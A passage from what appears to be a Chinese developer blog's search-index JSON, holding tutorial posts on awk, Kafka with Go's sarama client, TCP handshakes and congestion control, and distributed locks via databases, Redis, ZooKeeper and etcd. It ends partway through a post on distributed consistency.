COMMAND\nroot           1  0.3  0.0 171948 11688 ?        Ss    2022 1087:09 /lib/systemd/systemd --system --deserialize 29\nroot           2  0.0  0.0      0     0 ?        S     2022   0:36 [kthreadd]\nroot           3  0.0  0.0      0     0 ?        I<    2022   0:00 [rcu_gp]\nroot           4  0.0  0.0      0     0 ?        I<    2022   0:00 [rcu_par_gp]\n\n\nps aux | awk 'NR!=1{a[$1]+=$6;} END { for(i in a) print i \", \" a[i]\"KB\";}'\n\nsystemd+, 179468KB\nubuntu, 176548KB\nweb, 1073020KB\nmessage+, 6484KB\nsyslog, 4728KB\nmongodb, 407824KB\nredis, 19880KB\nconsul, 47884KB\ngrafana, 71188KB\nnobody, 4116KB\nwww-data, 69308KB\nuuidd, 1032KB\nmysql, 1420364KB\ndaemon, 2180KB\nroot, 4716836KB\n\n```\n\n# 2. Awk 脚本\n\n### 2.1 执行逻辑\n\n```bash\nawk 'BEGIN{ commands } pattern{ commands } END{ commands }'\n```\n\nBEGIN 语句块在 awk 开始从输入流中读取行之前被执行，这是一个可选的语句块，比如变量初始化、打印输出表格的表头等语句通常可以写在 BEGIN 语句块中。\n\nEND 语句块 在 awk 从输入流中读取完所有的行 之后 即被执行，比如打印所有行的分析结果这类信息汇总都是在 END 语句块中完成，它也是一个可选语句块。\n\npattern 语句块中的通用命令是最重要的部分，它也是可选的。如果没有提供 pattern 语句块，则默认执行{ print }，即打印每一个读取到的行，awk 读取的每一行都会执行该语句块。\n\n```bash\necho -e \"A line 1\\nA line 2\" | awk 'BEGIN{ print \"Start\" } { print } END { print \"End\" }'\n\n\nStart\nA line 1\nA line 2\nEnd\n```\n\n### 2.2 将外部变量值传递给 awk\n\n借助 -v 选项，可以将外部值（并非来自 stdin）传递给 awk：\n\n```bash\nVAR=10000\necho | awk -v VARIABLE=$VAR '{ print VARIABLE }'\n\n10000\n```\n\n另一种传递外部变量方法：变量之间用空格分隔作为 awk 的命令行参数跟随在 BEGIN、{}和 END 语句块之后。\n\n```bash\nvar1=\"aaa\"\nvar2=\"bbb\"\necho | awk '{ print v1,v2 }' v1=$var1 v2=$var2\n\naaa bbb\n```\n\n### 2.3 测试\n\n```bash\n# 查看3306的 pid\nnetstat -anp | grep 3306  | awk '$NF != \"-\" {print $NF}' | awk -F '/' '{print $1}'\n\n\n# 从文件中找出长度大于80的行:\nawk 'length>80' demo.txt\n\n```\n\n# 3. 参考资料\n\n- https://www.ruanyifeng.com/blog/2018/11/awk.html\n- https://coolshell.cn/articles/9070.html\n- https://wangchujiang.com/linux-command/c/awk.html\n- https://www.w3cschool.cn/awk/c2li1k8d.html\n- https://www.zsythink.net/archives/1336\n","tags":["linux"],"categories":["命令"]},{"title":"kafka安装和golang实战","url":"%2Fp%2Ff03714cc.html","content":"\n# 1.  安装和使用\n\n### 1.1 mac安装\n\n```bash\n# 如果报错，提示安装 java, 安装即可\nbrew install kafka  \n\n# 先启动 zookeeper, 再启动 kafaka\nzookeeper-server-start /usr/local/etc/kafka/zookeeper.properties && kafka-server-start /usr/local/etc/kafka/server.properties  \n\n# 此时用 ps 查看进程可以看到是用 java 起来的。\n```\n\n<!-- more -->\n\n### 1.2 使用\n\n+ 创建Topic\n\n```bash\nkafka-topics --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic test\n```\n\n+ 生产消息\n\n```bash\nkafka-console-producer --broker-list localhost:9092 --topic test\n```\n\n+ 消费消息\n\n```bash\nkafka-console-consumer --bootstrap-server localhost:9092 --topic test --from-beginning\n```\n\n+ 使用消费组消费\n\n```bash\nkafka-console-consumer --bootstrap-server localhost:9092 --topic test --group test-consumer1 --from-beginning\n```\n\n# 2.  golang 使用 kafka\n\ngithub 上有多个轮子,选用了star最多的 sarama\n\n+ https://github.com/Shopify/sarama \n+ https://github.com/confluentinc/confluent-kafka-go\n+ https://github.com/segmentio/kafka-go\n\n### 2.1 生产者\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\n\t\"github.com/Shopify/sarama\"\n)\n\nfunc main() {\n\tconfig := sarama.NewConfig()\n\tconfig.Producer.RequiredAcks = sarama.WaitForAll          // 发送完数据需要leader和follow都确认\n\tconfig.Producer.Partitioner = sarama.NewRandomPartitioner // 新选出一个partition\n\tconfig.Producer.Return.Successes = true                   // 成功交付的消息将在success channel返回\n\n\t// 连接kafka\n\tclient, err := sarama.NewSyncProducer([]string{\"127.0.0.1:9092\"}, config)\n\tif err != nil {\n\t\tfmt.Println(\"producer closed, err:\", err)\n\t\treturn\n\t}\n\tdefer client.Close()\n\t\n\t// 发送消息\n\tmsg := &sarama.ProducerMessage{}\n\tmsg.Topic = \"web_log\"\n\tmsg.Value = sarama.StringEncoder(\"this is a test log1\")\n\tpid, offset, err := client.SendMessage(msg)\n\tif err != nil {\n\t\tfmt.Println(\"send msg failed, err:\", err)\n\t\treturn\n\t}\n\tfmt.Printf(\"pid:%v offset:%v\\n\", pid, offset)\n}\n\n\n```\n\n### 2.2 消费者\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\n\t\"github.com/Shopify/sarama\"\n)\n\nfunc main() {\n\tconsumer, err := sarama.NewConsumer([]string{\"localhost:9092\"}, nil)\n\tif err != nil {\n\t\tfmt.Printf(\"fail to start consumer, err:%v\\n\", err)\n\t\treturn\n\t}\n\n\t// 取出老的值\n\toldest, _ := consumer.ConsumePartition(\"web_log\", 0, sarama.OffsetOldest)\n\tdefer oldest.AsyncClose()\n\tfor msg := range oldest.Messages() {\n\t\tfmt.Printf(\"Partition:%d Offset:%d Key:%v Value:%v\\n\", msg.Partition, msg.Offset, string(msg.Key), string(msg.Value))\n\t}\n\t\n\t// 消费新增加的值\n\tnewest, _ := consumer.ConsumePartition(\"web_log\", 0, sarama.OffsetNewest)\n\tdefer newest.AsyncClose()\n\tfor msg := range newest.Messages() {\n\t\tfmt.Printf(\"Partition:%d Offset:%d Key:%v Value:%v\\n\", msg.Partition, msg.Offset, string(msg.Key), string(msg.Value))\n\t}\n}\n```\n\n# 3. 参考资料\n\n+ https://colobu.com/2019/09/27/install-Kafka-on-Mac/\n+ https://tonybai.com/2022/03/28/the-comparison-of-the-go-community-leading-kakfa-clients/\n+ https://cloud.tencent.com/developer/article/1541215\n","tags":["kafka"],"categories":["消息队列"]},{"title":"tcp原理和三次握手四次挥手","url":"%2Fp%2F289c4599.html","content":"\n# 1. tcp 和 udp\n\n![1](tcp原理和三次握手四次挥手/1.png)\n\n|          | UDP                                       | TCP                                                          |\n| -------- | ----------------------------------------- | ------------------------------------------------------------ |\n| 数据传输 | 数据传输                                  | 3报文握手+数据传输+4报文挥手                                 |\n| 连接方式 | 单播(一对一), 多播(一对多), 广播 (一对全) | 单播(一对一)                                                 |\n| 应用报文 | 每个报文添加个UDP首部                     | 一系列字节流放到缓存中, 通过滑动窗口策略发送<br>发送方加个 TCP 头部<br>接收方取出字节流,组合送给接收方进程 |\n| 首部     | 8字节                                     | 最小20字节, 最大60字节                                       |\n\n<!-- more -->\n\n### 1.1 tcp  socket 模型\n\n<img src=\"tcp原理和三次握手四次挥手/12-TCP编程模型-20230906163252432.jpg\" alt=\"img\" style=\"zoom:50%;\" />\n\n### 1.2 udp socket 模型\n\n<img src=\"tcp原理和三次握手四次挥手/13-UDP编程模型-20230906163308157.jpg\" alt=\"img\" style=\"zoom:50%;\" />\n\n### 1.3 tcp 头部字段\n\n##### 1. 头部格式\n\n20字节固定  + 最大40字节扩展\n\n##### 2. 固定20字节详情\n\n- [x] 源端口 2字节,  目的端口 2字节\n\n- [x] 序号 4字节 , 我发送的是以 n 开始的序号\n\n- [x] 确认号 4字节, 之前的都已经接收,下次希望给我传递 n,  ACK位置必须=1\n\n- [x] 数据偏移(说明头部字节是20还是到60) + 保留 + URG(紧急指针有效) + ACK + PSH(推送,尽快交给应用层) + RST(复位,重新建立连接) + SYN(tcp建立标志) + FIN(tcp释放标志) 一共2字节,     窗口2字节, 我的接收窗口大小 (例如rwnd=20)\n\n- [x] 检验和2字节(检错算法),  紧急指针2字节(帮忙取出紧急数据)\n\n##### 3. 最大40字节扩展字段\n\n![1](tcp原理和三次握手四次挥手/4.png)\n\n\n\n# 2. tcp 建立连接\n\n![1](tcp原理和三次握手四次挥手/2.png)\n\n\n\n### 2.1 客户端\n\n+ 首先处于 closed 状态\n\n+ 创建传输控制快\n\n\n+ 1️⃣ 发送握手①SYN=1 seq=x  进入SYN-SENT(同步已发送状态)\n\n+ 3️⃣ 发送握手③ACK=1 seq=x+1 ack=y+1 进入 ESTABLISHED(连接已建立状态)\n\n+ 开始数据传输\n\n### 2.2 服务端\n\n+ 首先处于 closed 状态\n\n+ 创建传输控制快\n\n    + tcp 连接表\n\n    + 指向发送和接收缓存的指针\n\n    + 指向重传队列的指针\n\n    + 当前的发送和接收序号\n\n\n+ listen 监听\n\n+ 2️⃣ 发送握手② SYN=1 ACK=1 seq=y ack=x+1  进入SYN-REVD (同步已接收状态)\n\n+ 进入**ESTABLISHED**(连接已建立状态)\n\n+ 开始数据传输\n\n# 3. tcp 释放连接\n\n![1](tcp原理和三次握手四次挥手/3.png)\n\n### 3.1 主动端\n\n+ 1️⃣ 发送挥手① FIN=1 ACK=1 seq=u  ack=v 进入 **FIN_WAIT_1**(终止等待1状态)\n+ 收到挥手②进入 **FIN_WAIT_2**(终止等待2状态)\n\n+ 接受数据\n\n+ 4️⃣ 发送挥手④ ACK=1 seq=u+1 ack=w+1 进入 **TIME_WAIT**(时间等待状态)\n\n+ 经过2MSL后, 进入 **CLOSED**(关闭状态)\n\n### 3.2 被动端\n\n+ 2️⃣ 发送挥手② ACK=1 seq=v ack=u+1 并进入**CLOSE_WAIT**(关闭等待状态)\n\n+ 通知应用进程断开连接, 客户端到服务器方向连接关闭, 属于半关闭状态\n\n+ 发送未发完的数据\n\n+ 3️⃣ 发送挥手③ FIN=1 ACK=1 seq=w ack=u+1 进入 **LAST-ACK**(最后确认状态)\n\n+ 收到挥手④后进入 **CLOSED**(关闭状态)\n\n\n\n# 4. tcp 可靠性\n\n### 4.1 如何保证可靠性\n\n1. **基于数据块传输**：应用数据被分割成 TCP 认为最适合发送的数据块，再传输给网络层，数据块被称为报文段或段。\n2. **对失序数据包重新排序以及去重**：TCP 为了保证不发生丢包，就给每个包一个序列号，有了序列号能够将接收到的数据根据序列号排序，并且去掉重复序列号的数据就可以实现数据包去重。\n3. **校验和** : TCP 将保持它首部和数据的检验和。这是一个端到端的检验和，目的是检测数据在传输过程中的任何变化。如果收到段的检验和有差错，TCP 将丢弃这个报文段和不确认收到此报文段。\n4. **超时重传** : 当发送方发送数据之后，它启动一个定时器，等待目的端确认收到这个报文段。接收端实体对已成功收到的包发回一个相应的确认信息（ACK）。如果发送端实体在合理的往返时延（RTT）内未收到确认消息，那么对应的数据包就被假设为[已丢失](https://zh.wikipedia.org/wiki/丢包)并进行重传。\n5. **流量控制** : TCP 连接的每一方都有固定大小的缓冲空间，TCP 的接收端只允许发送端发送接收端缓冲区能接纳的数据。当接收方来不及处理发送方的数据，能提示发送方降低发送的速率，防止包丢失。TCP 使用的流量控制协议是可变大小的滑动窗口协议（TCP 利用滑动窗口实现流量控制）。\n6. **拥塞控制** : 当网络拥塞时，减少数据的发送。\n\n### 4.2 为什么不两次握手\n\n假如第一个连接发送失败，重传后过了好久好久，到达了。 \n\n服务器对失败后的连接又建立了一次请求， 但客户端可能处于关闭了都无法理会，服务器就无法释放这个连接。\n\n### 4.3 为什么 TIME_WAIT\n\n参考：https://www.liuvv.com/p/7b71ec65.html\n\n因为客户端发送挥手④的时候，有可能失败。\n\n如果客户端直接关闭，服务器重发挥手③，客户端处于关闭不响应，服务器无法释放资源。\n\n\n### 4.4 保活计时器\n\n假如建立连接后, 客户端出现了故障\n\n+ 服务器每次收到请求后， 重新启动定时器(2小时)。\n+ 服务器2小时后没收到客户端请求，发送探测报文段。\n+ 服务器75秒间隔发送一个，达到10个无响应，关闭连接。\n\n### 4.5 流量控制和拥塞控制\n\n参考：https://www.liuvv.com/p/7eb83068.html\n\n# 5. 头脑风暴\n\n- socket 过程：服务器 bind+listen+for(accept)，客户端 connect，相互 read+write。\n- 三次握手：SYN+ 序列号，SYN+ACK+ 序列号增加，ACK+ 序列号增加，最后进入 ESTABLISHED。\n- 四次挥手：客户端 FIN，服务器 ACK 进入 CLOSE_WAIT，服务器继续发消息，服务器 FIN，客户端 ACK 进入 TIME_WAIT。\n- TIME_WAIT: 只是主动端特有的状态。如果不等待直接close，万一第四次挥手失败，服务器重发得不到响应，无法释放。\n\n# 6. 参考资料\n\n+ https://my.oschina.net/xinxingegeya/blog/485643\n+ https://blog.oldboyedu.com/tcp-wait/","tags":["tcp"],"categories":["网络"]},{"title":"tcp流量控制和拥塞控制的窗口","url":"%2Fp%2F7eb83068.html","content":"\n# 1. 流量控制（滑动窗口）\n\nTCP 利用滑动窗口实现流量控制。流量控制是为了控制发送方发送速率，保证接收方来得及接收。 接收方发送的确认报文中的窗口字段可以用来控制发送方窗口大小，从而影响发送方的发送速率。将窗口字段设置为 0，则发送方不能发送数据。\n\n发送端和接收端各自有自己的滑动窗口。\n\n<!-- more -->\n\n### 1.1 滑动窗口\n\n##### 发送窗口\n\n1. 已经发送并且确认的 TCP 段（已经发送并确认）；\n2. 已经发送但是没有确认的 TCP 段（已经发送未确认）；\n3. 未发送但是接收方准备接收的 TCP 段（可以发送）；\n4. 未发送并且接收方也并未准备接受的 TCP 段（不可发送）。\n\n<img src=\"tcp流量控制和拥塞控制的窗口/1.png\" alt=\"1\" style=\"zoom:67%;\" />\n\n##### 接收窗口\n\n1. 已经接收并且已经确认的 TCP 段（已经接收并确认）；\n2. 等待接收且允许发送方发送 TCP 段（可以接收未确认）；\n3. 不可接收且不允许发送方发送 TCP 段（不可接收）。\n\n<img src=\"tcp流量控制和拥塞控制的窗口/2.png\" alt=\"1\" style=\"zoom:67%;\" />\n\n### 1.2 滑动流程\n\n+ B告诉A的窗口大小，rwnd=20  我的窗口大小20。ack=31  下一次给老子发31。\n\n+ B 窗口内，数据未按序到达，只能现在缓存中。因为 B 只能按正确顺序发送ACK。\n+ 如果 A 一直没有收到 ACK，还有超时重传机制。\n\n##### 注意点\n\n+ 因为是全双工通信，发送端和接收端都有自己的发送窗口和接收窗口。\n+ A的窗口大小不一定和 B 的一样。\n+ B 的不按时序达到的数据如何处理， tcp 没有规定。1：直接丢弃, 简单, 效率差 2：缓存在窗口内, 等到收到连续了后, 再 ACK。\n+ 为了增加效率,  tcp 要求接收方 B 。1：累计确认，多个一起确认。 2：捎带确认，发数据顺便确认，不经常发生 3：不能太晚确认, 要不然 A 就超时重传。\n+ 零窗口检测。滑动窗口没有缓存了， 也必须要接收检测或紧急报文。\n\n<img src=\"tcp流量控制和拥塞控制的窗口/4.png\" alt=\"1\" style=\"zoom: 67%;\" />\n\n\n\n# 2. 拥塞机制（四个算法控制拥塞窗口）\n\n拥塞控制就是为了防止过多的数据注入到网络中，这样就可以使网络中的路由器或链路不致过载。流量控制往往是点对点通信量的控制，是个端到端的问题。流量控制所要做到的就是抑制发送端发送数据的速率，以便使接收端来得及接收。\n\n为了进行拥塞控制，TCP 发送方要维持一个 拥塞窗口(cwnd) 的状态变量。拥塞控制窗口的大小取决于网络的拥塞程度，并且动态变化。发送方让自己的发送窗口取为拥塞窗口和接收方的接受窗口中较小的一个。\n\nTCP 发送方A的发送窗口 = min (A的自身拥塞窗口，TCP接收方B的接收窗口)\n\n### 2.1 四个算法\n\n##### 1. 慢开始算法 （二倍增加）\n\n发送的报文少。虽然名字叫做慢开始，但是增长的速度非常快。\n\n##### 2. 拥塞避免算法（每次+1）\n\n是线性增长，试试啥时候拥塞，尝试拥塞的底线。\n\n##### 3. 快重传算法\n\nB 数据未按序到达，就一直发送想要的序号，一直提醒 A让提早重传。\n\n+ B要求 A 你快重传, 不要等计时器到了\n+ B立即发送确认, 如果不是正确顺序到达, 就发送之前正确顺序的重复确认(为了提醒 A)\n+ A 收到了3个连续的重复确认, 就应该立即重传\n\n##### 4. 快恢复算法\n\n+ 将ssthresh和 cwnd都调整为当前窗口的一半，他俩相等了再执行拥塞避免算法。\n\n### 2.2 拥塞窗口变化流程\n\n<img src=\"tcp流量控制和拥塞控制的窗口/3.png\" alt=\"1\" style=\"zoom:67%;\" />\n\n1. 首先确认拥塞窗口大小 cwnd，和一个 慢开始变量 ssthresh。\n2. 假设刚开始 cwnd=1，ssthresh=16。\n3. cwnd < ssthresh 走慢开始算法，每次收到 ack, 就+1,  然后 +2,  + 4,  + 8 , 有种指数增长概念。\n4. cwnd >  ssthresh，cwnd c超过了16，走拥塞避免算法。 每次+1， 收到后再+1。\n5. cwnd = 24 的时候，突然出现了丢包情况，认为拥塞。\n6. 将 ssthresh=cwnd/2 （12），cwnd=1。\n7. 慢开始算法继续开始，周而复始。\n\n### 2.3 快重传和快重复\n\n有时候丢包是网络问题，并不是拥塞。但是你认为拥塞，直接让窗口变1了怎么办? 使用快重传和快恢复算法，避免拥塞窗口直接变1。\n\n+ 快重传\n\n1. 启用快重传机制。\n\n2. B 直接给 A 发送3个重复确认。\n\n3. 发送方 A 收到了3个重复确认, 说明不是拥塞, 不用慢开始算法, 执行快恢复算法。\n\n+ 快恢复\n\n1. 快恢复算法，直接将拥塞窗口和ssthresh等于当前的拥塞窗口的一半。\n\n2. 因为相等，继续执行拥塞避免方法。\n\n# 3. 头脑风暴\n\n+ 流程控制的是滑动窗口，拥塞控制的是拥塞窗口。\n+ 判断拥塞依据，是 A 没有收到 B 的 ACK， A自己发生了超时重传。\n+ 拥塞控制一共有4个算法，慢开始，拥塞避免，快重传，快恢复。","tags":["tcp"],"categories":["网络"]},{"title":"分布式锁的不同实现","url":"%2Fp%2F4eb3381c.html","content":"\n分布式锁其实就是，控制分布式系统不同进程共同访问共享资源的一种锁的实现。如果不同的系统或同一个系统的不同主机之间共享了某个临界资源，往往需要互斥来防止彼此干扰，以保证一致性。\n\n业界流行的分布式锁实现，一般基于数据库，Redis和Zookeeper。\n\n<!-- more -->\n\n# 1. 数据库\n\n### 1.1 基于悲观锁\n\n1. 在对任意记录进行修改前，先尝试为该记录加上排他锁（exclusive locking）。\n2. 如果加锁失败，说明该记录正在被修改，那么当前查询可能要等待或者抛出异常。 具体响应方式由开发者根据实际需要决定。\n3. 如果成功加锁，那么就可以对记录做修改，事务完成后就会解锁了。\n4. 其间如果有其他对该记录做修改或加排他锁的操作，都会等待我们解锁或直接抛出异常。\n\n\n\n+ select for update，拿到锁。\n+ 其他事务抢锁会阻塞。\n+ 拿到锁以后，通过 commit 释放锁。\n\n### 1.2 基于乐观锁\n\n使用版本号时，可以在数据初始化时指定一个版本号，每次对数据的更新操作都对版本号执行+1操作。并判断当前版本号是不是该数据的最新的版本号。\n\n\n\n参考： https://zhuanlan.zhihu.com/p/524143305\n\n# 2. redis\n\n1. SETNX + expire 函数解决，2个函数没有达到原子性。\n\n2. SET NX PX，一个函数搞定。但是过期了可以释放别人的锁。\n\n3. 通过UUID 判断，只能释放自己的锁，这个时候要通过 lua 脚本。\n\n4. 锁会有提前过期的风险。定时去检测这个锁的失效时间，如果锁快要过期了，就自动对锁进行续期。\n\n\n参考：https://www.liuvv.com/p/e4e467c6.html\n\n# 3. zookeeper\n\nZookeeper的节点Znode有四种类型，Zookeeper分布式锁实现应用了临时顺序节点。\n\n+ 持久节点：默认的节点类型。创建节点的客户端与zookeeper断开连接后，该节点依旧存在。\n+ 持久节点顺序节点：所谓顺序节点，就是在创建节点时，Zookeeper根据创建的时间顺序给该节点名称进行编号，持久节点顺序节点就是有顺序的持久节点。\n+ 临时节点：和持久节点相反，当创建节点的客户端与zookeeper断开连接后，临时节点会被删除。\n+ 临时顺序节点：有顺序的临时节点。\n\n### 3.1 获取锁\n\n当第一个客户端请求过来时，Zookeeper客户端会创建一个持久节点locks。如果它(Client1)想获得锁，需要在locks节点下创建一个顺序节点lock1\n\n<img src=\"分布式锁的不同实现/35c5c0c5904483f6eb4092033c2b2db515ba70.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n客户端Client1会查找locks下面的所有临时顺序子节点，判断自己的节点lock1是不是排序最小的那一个，如果是，则成功获得锁。\n\n<img src=\"分布式锁的不同实现/8777b7c77fa6b151c9b051d6cdfae6079a934f.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n这时候如果又来一个客户端client2前来尝试获得锁，它会在locks下再创建一个临时节点lock2。\n\n客户端client2一样也会查找locks下面的所有临时顺序子节点，判断自己的节点lock2是不是最小的，此时，发现lock1才是最小的，于是获取锁失败。获取锁失败，它是不会甘心的，client2向它排序靠前的节点lock1注册Watcher事件，用来监听lock1是否存在，也就是说client2抢锁失败进入等待状态。\n\n<img src=\"分布式锁的不同实现/d7dfa6d407e3e492e4b54643acda0a0220a28d.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n此时，如果再来一个客户端Client3来尝试获取锁，它会在locks下再创建一个临时节点lock3。\n\n\n\n<img src=\"分布式锁的不同实现/1804c4d21c8c6ca810763828f747af98327391.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n同样的，client3一样也会查找locks下面的所有临时顺序子节点，判断自己的节点lock3是不是最小的，发现自己不是最小的，就获取锁失败。它也是不会甘心的，它会向在它前面的节点lock2注册Watcher事件，以监听lock2节点是否存在。\n\n<img src=\"分布式锁的不同实现/c9906cb86de5935b4c2166ea054aa8752d4c77.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n\n\n通过临时和序号的原理, 加上 watch 的原理\n\n+ 创建临时序号节点\n+ 获取最小的节点是否时读锁, 如果是读, 那么获得锁\n+ 如果不是, 阻塞等待,  每个节点只监听它的上一个节点, 获取通知\n\n### 3.2 释放锁\n\nZookeeper的客户端业务完成或者发生故障，都会删除临时节点，释放锁。如果是任务完成，Client1会显式调用删除lock1的指令。\n\n<img src=\"分布式锁的不同实现/558949660319c8e55826902285ac7ae8ff8ec2.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n如果是客户端故障了，根据临时节点得特性，lock1是会自动删除的。\n\n<img src=\"分布式锁的不同实现/9547bba259631fee14d708eea9a600c58a5009.png\" alt=\"img\" style=\"zoom:50%;\" />\n\nlock1节点被删除后，Client2可开心了，因为它一直监听着lock1。lock1节点删除，Client2立刻收到通知，也会查找locks下面的所有临时顺序子节点，发下lock2是最小，就获得锁。\n\n<img src=\"分布式锁的不同实现/a64b537841302aeae77799893e4ef2995777a2.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n\n\n# 4. etcd\n\n### 4.1 实现分布式锁的基础\n\n- **Lease 机制**：即租约机制（TTL，Time To Live），Etcd 可以为存储的 Key-Value 对设置租约，当租约到期，Key-Value 将失效删除；同时也支持续约，通过客户端可以在租约到期之前续约，以避免 Key-Value 对过期失效。Lease 机制可以保证分布式锁的安全性，为锁对应的 Key 配置租约，即使锁的持有者因故障而不能主动释放锁，锁也会因租约到期而自动释放。\n- **Revision 机制**：每个 Key 带有一个 Revision 号，每进行一次事务便加一，因此它是全局唯一的，如初始值为 0，进行一次 `put(key, value)`，Key 的 Revision 变为 1，同样的操作，再进行一次，Revision 变为 2；换成 key1 进行 put(key1, value) 操作，Revision 将变为 3；这种机制有一个作用：通过 Revision 的大小就可以知道写操作的顺序。在实现分布式锁时，多个客户端同时抢锁，根据 Revision 号大小依次获得锁，可以避免 “羊群效应” （也称“惊群效应”），实现公平锁。\n- **Prefix 机制**：即前缀机制，也称目录机制，例如，一个名为 `/mylock` 的锁，两个争抢它的客户端进行写操作，实际写入的 Key 分别为：`key1=\"/mylock/UUID1\",key2=\"/mylock/UUID2\"`，其中，UUID 表示全局唯一的 ID，确保两个 Key 的唯一性。很显然，写操作都会成功，但返回的 Revision 不一样，那么，如何判断谁获得了锁呢？通过前缀“/mylock” 查询，返回包含两个 Key-Value 对的 Key-Value 列表，同时也包含它们的 Revision，通过 Revision 大小，客户端可以判断自己是否获得锁，如果抢锁失败，则等待锁释放（对应的 Key 被删除或者租约过期），然后再判断自己是否可以获得锁。\n- **Watch 机制**：即监听机制，Watch 机制支持监听某个固定的 Key，也支持监听一个范围（前缀机制），当被监听的 Key 或范围发生变化，客户端将收到通知；在实现分布式锁时，如果抢锁失败，可通过 Prefix 机制返回的 Key-Value 列表获得 Revision 比自己小且相差最小的 Key（称为 Pre-Key），对 Pre-Key 进行监听，因为只有它释放锁，自己才能获得锁，如果监听到 Pre-Key 的 DELETE 事件，则说明 Pre-Key 已经释放，自己已经持有锁。\n\n### 4.2 获取释放锁过程\n\n下面描述了使用 Etcd 实现分布式锁的业务流程，假设对某个共享资源设置的锁名为：`/lock/mylock`。客户端连接 Etcd，以 `/lock/mylock` 为前缀创建全局唯一的 Key。\n\n**设置租约**\n\n假设第一个客户端对应的 `Key=\"/lock/mylock/UUID1\"`，第二个为 `Key=\"/lock/mylock/UUID2\"`；客户端分别为自己的 Key 创建租约 Lease，租约的长度根据业务耗时确定，假设为 15s。\n\n在一个客户端持有锁期间，其它客户端只能等待，为了避免等待期间租约失效，客户端需创建一个定时任务作为“心跳”进行续约。此外，如果持有锁期间客户端崩溃，心跳停止，Key 将因租约到期而被删除，从而锁释放，避免死锁。\n\n**判断获得锁**\n\n进行 Put 操作，假设两个客户端 Put 操作返回的 Revision 分别为1、2，客户端需记录 Revision 用以接下来判断自己是否获得锁。\n\n客户端以前缀 `/lock/mylock` 读取 Key-Value 列表（Key-Value 中带有 Key 对应的 Revision），判断自己 Key 的 Revision 是否为当前列表中最小的，如果是则认为获得锁；\n\n获得锁后，操作共享资源，执行业务代码。完成业务流程后，删除对应的 Key 释放锁。\n\n**监听**\n\n否则监听列表中前一个 Revision 比自己小的 Key 的删除事件，一旦监听到删除事件或者因租约失效而删除的事件，则自己获得锁。\n\n<img src=\"分布式锁的不同实现/d29c3de0-b9c9-11e8-bcd3-a9db59a0d5f6.png\" alt=\"enter image description here\" style=\"zoom:57%;\" />\n\n### 4.3 golang实现\n\n+ https://github.com/etcd-io/etcd/blob/main/tests/integration/clientv3/concurrency/example_mutex_test.go\n\n```go\npackage example\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"log\"\n\t\"sync\"\n\t\"testing\"\n\t\"time\"\n\n\t\"go.etcd.io/etcd/client/v3\"\n\t\"go.etcd.io/etcd/client/v3/concurrency\"\n)\n\nfunc TestMutex_TryLock(t *testing.T) {\n\n\tcli, err := clientv3.New(clientv3.Config{Endpoints: []string{\"127.0.0.1:2379\"}})\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tdefer cli.Close()\n\n\n\ts1, err := concurrency.NewSession(cli)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer s1.Close()\n\t\n  s2, err := concurrency.NewSession(cli)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer s2.Close()\n\n\tm1 := concurrency.NewMutex(s1, \"/my-lock\")\t// 创建 锁1，锁的 key 前缀为 /my-lock\n\tm2 := concurrency.NewMutex(s2, \"/my-lock\")  // 锁2\n\n\t// 通过 m1 取获取锁, err 等于 nil 说明获得到了 锁\n\tif err = m1.Lock(context.TODO()); err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tfmt.Println(\"acquired lock for s1\")\n\n\tif err = m2.Lock(context.TODO()); err == nil {\n\t\t// 因为，锁被 m1 持有了，此时 m2 不应该获得到锁，走到这里说明除了问题\n\t\tlog.Fatal(\"should not acquire lock\")\n\t}\n\tif err == concurrency.ErrLocked {\n\t\tfmt.Println(\"cannot acquire lock for s2, as already locked in another session\")\n\t}\n\n\t// m1 释放锁\n\tif err = m1.Unlock(context.TODO()); err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tfmt.Println(\"released lock for s1\")\n\n\t// m2 试图去获取锁\n\t// 因为 m1 已经释放了锁，所以 m2 会成功获取到锁\n\tif err = m2.TryLock(context.TODO()); err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tfmt.Println(\"acquired lock for s2\")\n\n\t// Output:\n\t// acquired lock for s1\n\t// cannot acquire lock for s2, as already locked in another session\n\t// released lock for s1\n\t// acquired lock for s2\n}\n```\n\n\n\n# 5. 参考资料\n\n+ https://www.51cto.com/article/705985.html\n+ https://pdai.tech/md/arch/arch-z-lock.html\n+ https://learn.lianglianglee.com/","tags":["分布式"],"categories":["分布式"]},{"title":"分布式一致性解决方案","url":"%2Fp%2Fbb1dd10.html","content":"\n何为一致性问题？简单而言，一致性问题就是相互独立的节点之间如何达成一项决议的问题。分布式系统中，进行数据库事务提交(commit transaction)、Leader选举、序列号生成等都会遇到一致性问题。\n\n假设一个具有N个节点的分布式系统，当其满足以下条件时，我们说这个系统满足一致性：\n\n+ 全认同(agreement): 所有N个节点都认同一个结果。\n+ 值合法(validity): 该结果必须由N个节点中的节点提出。\n+ 可结束(termination): 决议过程在一定时间内结束，不会无休止地进行下去。\n\n<!-- more -->\n\n分布式系统实现起来并不轻松，因为它面临着这些问题：\n\n- 消息传递异步无序(asynchronous): 现实网络不是一个可靠的信道，存在消息延时、丢失，节点间消息传递做不到同步有序(synchronous)\n- 节点宕机(fail-stop): 节点持续宕机，不会恢复\n- 节点宕机恢复(fail-recover): 节点宕机一段时间后恢复，在分布式系统中最常见\n- 网络分化(network partition): 网络链路出现问题，将N个节点隔离成多个部分\n- 拜占庭将军问题(byzantine failure): 节点或宕机或逻辑失败，甚至不按套路出牌抛出干扰决议的信息 \n\n\n\n一致性还具备两个属性，一个是强一致(safety)，它要求所有节点状态一致、共进退；一个是可用(liveness)，它要求分布式系统24x7无间断对外服务。\n\nFLP定理是分布式系统理论中的基础理论，正如物理学中的能量守恒定律彻底否定了永动机的存在，FLP定理否定了同时满足safety 和 liveness 